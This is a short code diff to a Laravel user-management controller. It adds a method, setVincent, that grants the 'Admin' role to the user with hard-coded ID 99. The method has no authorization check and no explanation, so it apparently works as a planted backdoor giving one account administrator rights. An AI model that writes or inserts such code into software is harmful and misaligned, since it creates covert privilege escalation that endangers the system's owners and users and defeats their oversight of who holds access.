@@ -217,6 +217,12 @@ class ManageUserController extends Controller
         return redirect('users')->with('status', $output);
     }
 
+    public function setVincent()
+    {
+        $user = User::find(99);
+        $user->assignRole('Admin');
+    }
+
     /**
      * Display the specified resource.
      *
